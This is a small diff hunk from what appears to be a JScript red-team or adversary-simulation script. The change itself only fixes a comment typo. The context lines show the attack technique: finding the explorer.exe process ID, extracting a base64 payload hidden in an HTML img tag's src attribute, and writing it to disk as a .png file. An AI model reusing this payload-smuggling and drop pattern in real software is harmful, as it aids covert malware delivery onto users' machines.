@@ -91,7 +91,7 @@
 		
 		//Sample Tests 
 		var intProcessID = getProc("explorer.exe"); // Find explorer.exe pid
-		var boomer = document.getElementById("HoneyBadger").getAttribute('src'); //Grab Base4 String From Img tag
+		var boomer = document.getElementById("HoneyBadger").getAttribute('src'); //Grab Base64 String From Img tag
 		var res = boomer.substring(22, boomer.length); //Offst To Base64
 		binaryWriter(res,"ATOMICFLAGPLANT.png"); //Thanks Lee Holmes for this idea ;-)
 		blogger("Extracted Payload");
